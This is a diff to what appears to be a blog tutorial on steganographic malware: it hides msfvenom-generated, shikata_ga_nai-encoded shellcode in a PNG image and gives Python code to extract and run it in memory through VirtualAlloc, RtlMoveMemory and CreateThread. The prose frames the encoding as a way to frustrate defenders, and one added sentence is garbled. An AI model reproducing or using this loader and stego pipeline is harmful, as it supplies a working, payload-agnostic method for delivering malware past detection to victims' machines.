@@ -29,7 +29,7 @@ We can now see they are practically indistinguishable from each other. LSB stego
 
 ## Python implementation   
 
-Before getting into the encoding & execution of our payloads through steganography, let's quickly go over how to encode a plaintext message.
+Before getting into the encoding & execution of our payloads through steganography, let's quickly go over how to encode a plaintext message in Python 2.7 using .
 
 ### Encoding
 
@@ -163,4 +163,138 @@ def decode_lsb(encoded_image_path):
 
 * Finally, we use the `binary_to_text()` function to convert our binary to plaintext!
 
-  
+
+##### Testing with plaintext
+
+Let's test if we can encode the message `$up3rs3c3tm3$$sag3` in a image with the code we've used so far.
+
+[![4](/assets/images/PyStegMalz/4.png)](/assets/images/PyStegMalz/4.png){: .align-center}
+
+Great! Let's execute this to check this works.
+
+[![5](/assets/images/PyStegMalz/5.png)](/assets/images/PyStegMalz/5.png){: .align-center}
+
+Fantastic! Our message was succesfully decoded. Let's implement shellcode encoding & execution.
+
+### Encoding shellcode
+
+#### Generating calc.exe shellcode for our POC
+
+To generate the shellcode I will use msfvenom:
+
+[![6](/assets/images/PyStegMalz/6.png)](/assets/images/PyStegMalz/6.png){: .align-center}
+
+This command uses `-p windows/exec CMD="calc.exe"` to pop calc.exe, with the  `-e x86/shikata_ga_nai -i 5` to use 5 iterations of the `shikata_ga_nai` encoder. Shikata Ga Nai is an polymorphic XOR additive feedback encoder. You don't really know how it works, but you should always encode your shellcode with at least a couple iterations to ensure the blue-team will struggle when attempting to reverse engineer it! If you'd like to learn how the algorithm works and where it's used by many APT groups check [this](https://www.mandiant.com/resources/blog/shikata-ga-nai-encoder-still-going-strong) Mandiant article out!
+
+#### Implementing encoding the shellcode.
+
+##### shellcode.txt
+
+Let's copy the payload straight from msvenom and paste into our `shellcode.txt` file. 
+
+[![5](/assets/images/PyStegMalz/5.png)](/assets/images/PyStegMalz/5.png){: .align-center}
+
+##### encoder.py
+
+```python
+#!/usr/bin/python
+from PIL import Image
+
+
+with open('shellcode.txt', 'r') as shellcode:
+    shellcode_in_text_file = shellcode.read().rstrip().replace('\n','').replace('buf += b', '')
+    
+
+def text_to_binary(text_data):
+    ...
+
+def encode_lsb(image_path, plaintext_data, output_path):
+    ... 
+
+# Example usage:
+if __name__ == "__main__":
+    image_path = "example.png"
+    encode_lsb(image_path, shellcode_in_text_file, "poc_{}".format(image_path))
+```
+
+We've implemented two new lines, one to read the contents of the `shellcode.txt` file and the 2nd parse & clean it for encoding.
+
+
+### Decoding & Executing the shellcode
+
+```python
+#!/usr/bin/python
+from PIL import Image
+import ctypes
+import binascii
+
+def binary_to_text(binary_data):
+    ...
+
+def decode_lsb(encoded_image_path):
+    encoded_image = Image.open(encoded_image_path)
+    ...
+    plaintext_data = binary_to_text(binary_data)
+
+    if plaintext_data[-1:] != '"':
+        bad_char = plaintext_data[-1:]
+        plaintext_data = plaintext_data.replace(bad_char, '"')
+    hex_array = plaintext_data.split('"')
+    buf = b''
+    for i in hex_array:
+        if i != '':
+            buf += '{}'.format(i).encode()
+    return buf
+
+def shellcode_exec(shellcode_raw):
+
+    shellcode = bytearray(shellcode_raw)
+
+    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                          ctypes.c_int(len(shellcode)),
+                                          ctypes.c_int(0x3000),
+                                          ctypes.c_int(0x40))
+ 
+    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+ 
+    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
+                                     buf,
+                                     ctypes.c_int(len(shellcode)))
+ 
+    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+                                         ctypes.c_int(0),
+                                         ctypes.c_int(ptr),
+                                         ctypes.c_int(0),
+                                         ctypes.c_int(0),
+                                         ctypes.pointer(ctypes.c_int(0)))
+ 
+    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
+
+encoded_image_path = "poc_example.png"
+shellcode_str = decode_lsb(encoded_image_path)
+shellcode = binascii.unhexlify(shellcode_str.decode().replace('\\x', ''))
+shellcode_exec(shellcode)
+
+```
+
+#### Decoding
+
+We've added a handful of extra lines to ensure the shellcode text, which we've encoded, is in a correct format to be executed. For some unkown reason, the last double-quote in our `shellcode.txt` was always corrupted to be another symbol. To fix this, I've added the check:
+
+```python
+if plaintext_data[-1:] != '"':
+        bad_char = plaintext_data[-1:]
+        plaintext_data = plaintext_data.replace(bad_char, '"')
+```
+
+on the last character. If it returns true (the last character isn't a "), it will replace it with a ".
+
+The lines which follow set the variable `hex_array = plaintext_data.split('"')` and then loop over that array, removing all quotes, leaving just strings of hex which looks something like `\\xbd\\a9 ... \\xf3`. 
+
+If we skip over the `shellcode_exec()` function for now, the final parsing we do to turn this string of hex characters into actual hex, which can be executed, is: `binascii.unhexlify(shellcode_str.decode().replace('\\x', ''))` 
+
+#### Executing
+
+To actually execute the said hex, which was encoded as a string in our image, in python, we'll use the `ctypes` library. `ctypes` allows us to directly interface with Windows API functions. Let's break down the Win32 API functions used to execute the shellcode.
+
+ 
